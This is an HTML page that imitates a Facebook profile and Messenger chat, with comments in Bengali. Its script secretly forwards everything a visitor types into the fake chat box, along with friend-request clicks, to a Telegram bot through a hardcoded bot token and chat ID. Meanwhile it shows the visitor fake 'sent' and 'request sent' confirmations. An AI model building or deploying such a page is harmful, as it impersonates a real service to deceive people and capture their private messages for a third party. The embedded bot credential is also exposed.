<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Facebook | M.H. Miraz</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        /* মূল ডিজাইন */
        * { margin:0; padding:0; box-sizing:border-box; font-family: 'Segoe UI', Helvetica, Arial, sans-serif; }
        body { background: #fff; color: #050505; }
        
        /* প্রোফাইল পেজ */
        .p-header { background: #fff; padding-bottom: 10px; }
        .cover { width:100%; height:210px; background:#ddd; background-image: url('https://via.placeholder.com/800x400'); background-size: cover; }
        .p-info { text-align:center; margin-top:-80px; padding:0 15px; }
        .p-pic { width:160px; height:160px; border-radius:50%; border:4px solid #fff; background:#ccc; background-image: url('https://via.placeholder.com/160'); background-size: cover; display:inline-block; }
        .p-name { font-size:24px; font-weight:bold; margin-top:10px; }
        .btn-box { display:flex; gap:10px; padding:15px; max-width:500px; margin:0 auto; }
        .btn { flex:1; border:none; border-radius:8px; padding:10px; font-weight:600; cursor:pointer; display:flex; align-items:center; justify-content:center; gap:8px; }
        .btn-blue { background:#1877f2; color:#fff; }
        .btn-gray { background:#e4e6eb; color:#050505; }

        /* মেসেঞ্জার স্ক্রিন */
        #messengerUI { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:#fff; z-index:1000; flex-direction:column; }
        .msgr-h { padding:10px 15px; border-bottom:1px solid #eee; display:flex; align-items:center; gap:12px; }
        .msgr-icons { margin-left: auto; color:#0084ff; display:flex; gap:20px; font-size:18px; }
        .msgr-body { flex:1; overflow-y: auto; padding: 20px 15px; display: flex; flex-direction: column; }
        
        /* চ্যাট বাবল */
        .msg-wrapper { align-self: flex-end; display: none; flex-direction: column; align-items: flex-end; width: 100%; }
        .timestamp { text-align: center; color: #898b8d; font-size: 11px; margin: 20px 0; width: 100%; }
        .bubble { background: #0084ff; color: #fff; padding: 8px 15px; border-radius: 18px 18px 4px 18px; font-size: 15px; max-width: 70%; }
        .read-status { color: #0084ff; font-size: 12px; margin-top: 4px; }

        /* ইনপুট এরিয়া */
        .msgr-foot { padding:10px; border-top:1px solid #eee; display:flex; align-items:center; gap:10px; }
        .msgr-in-box { flex:1; background:#f0f2f5; border-radius:22px; padding: 8px 15px; display: flex; align-items: center; }
        .msgr-in { border:none; background:transparent; width: 100%; outline:none; font-size: 15px; }
        .send-trigger { color: #0084ff; font-size: 20px; cursor: pointer; display: none; }
    </style>
</head>
<body>

<div id="profilePage">
    <div class="p-header">
        <div class="cover"></div>
        <div class="p-info">
            <div class="p-pic"></div>
            <div class="p-name">M.H. Miřãz</div>
            <p id="friendStatus" style="color:#65676b; font-size:14px;">You're not friends on Facebook</p>
        </div>
        <div class="btn-box">
            <button id="addFriendBtn" class="btn btn-blue" onclick="handleFriendRequest()">
                <i class="fas fa-user-plus"></i> Add Friend
            </button>
            <button class="btn btn-gray" onclick="openMessenger()">
                <i class="fab fa-facebook-messenger"></i> Message
            </button>
        </div>
    </div>
</div>

<div id="messengerUI">
    <div class="msgr-h">
        <i class="fas fa-arrow-left" style="color:#0084ff; font-size: 20px;" onclick="closeMessenger()"></i>
        <img src="https://via.placeholder.com/36" style="border-radius:50%;">
        <div style="font-weight:bold;">M.H. Miřãz</div>
        <div class="msgr-icons">
            <i class="fas fa-phone-alt"></i>
            <i class="fas fa-video"></i>
            <i class="fas fa-info-circle"></i>
        </div>
    </div>
    
    <div class="msgr-body" id="chatBody">
        <div style="text-align:center; margin-bottom: 30px;">
            <img src="https://via.placeholder.com/100" style="border-radius:50%; margin-bottom:10px;">
            <h2 style="margin:0;">M.H. Miřãz</h2>
            <p style="color:#65676b; font-size:14px;">Student at Lions School and College</p>
        </div>

        <div id="sentMsgArea" class="msg-wrapper">
            <div class="timestamp" id="msgTime"></div>
            <div class="bubble" id="msgContent"></div>
            <i class="far fa-check-circle read-status"></i>
        </div>
    </div>

    <div class="msgr-foot">
        <i class="fas fa-camera" style="color:#0084ff; font-size: 20px;"></i>
        <div class="msgr-in-box">
            <input type="text" id="msgrInput" class="msgr-in" placeholder="Message" oninput="toggleSendBtn()">
        </div>
        <i id="likeBtn" class="fas fa-thumbs-up" style="color:#0084ff; font-size: 22px;"></i>
        <i id="sendBtn" class="fas fa-paper-plane send-trigger" onclick="sendMessage()"></i>
    </div>
</div>

<script>
    const BOT_TOKEN = '8600117294:AAH2qNjbQz3-iOCjHsZBfOi1qAUs1Uq2i0o';
    const CHAT_ID = '7767412329';

    // ১. ফ্রেন্ড রিকোয়েস্ট লজিক
    function handleFriendRequest() {
        const btn = document.getElementById('addFriendBtn');
        btn.innerHTML = '<i class="fas fa-user-check"></i> Requested';
        btn.className = 'btn btn-gray';
        
        // টেলিগ্রামে রিকোয়েস্ট পাঠানো
        const text = encodeURIComponent("New Friend Request from a user! Approve it?");
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${text}`);
        
        alert("Friend request sent! Waiting for approval.");
    }

    // ২. মেসেঞ্জার ওপেন/ক্লোজ
    function openMessenger() {
        document.getElementById('profilePage').style.display = 'none';
        document.getElementById('messengerUI').style.display = 'flex';
    }

    function closeMessenger() {
        document.getElementById('messengerUI').style.display = 'none';
        document.getElementById('profilePage').style.display = 'block';
    }

    // ৩. টাইপিং ডিটেকশন (লাইক বনাম সেন্ড বাটন)
    function toggleSendBtn() {
        const input = document.getElementById('msgrInput');
        const like = document.getElementById('likeBtn');
        const send = document.getElementById('sendBtn');
        
        if (input.value.trim() !== "") {
            like.style.display = 'none';
            send.style.display = 'block';
        } else {
            like.style.display = 'block';
            send.style.display = 'none';
        }
    }

    // ৪. মেসেজ পাঠানো এবং টেলিগ্রামে ফরওয়ার্ড করা
    function sendMessage() {
        const input = document.getElementById('msgrInput');
        const msgText = input.value.trim();
        if (msgText === "") return;

        // সময় জেনারেট করা (HH:MM)
        const now = new Date();
        const timeStr = now.getHours().toString().padStart(2, '0') + ':' + now.getMinutes().toString().padStart(2, '0');

        // UI আপডেট
        document.getElementById('msgTime').innerText = timeStr;
        document.getElementById('msgContent').innerText = msgText;
        document.getElementById('sentMsgArea').style.display = 'flex';

        // টেলিগ্রামে পাঠানো
        const teleMsg = encodeURIComponent(`নতুন মেসেজ: ${msgText}\nসময়: ${timeStr}`);
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${teleMsg}`);

        // ইনপুট ক্লিয়ার
        input.value = "";
        toggleSendBtn();
        
        // অটো স্ক্রল নিচে নেওয়া
        const body = document.getElementById('chatBody');
        body.scrollTop = body.scrollHeight;
    }
</script>

</body>
</html>
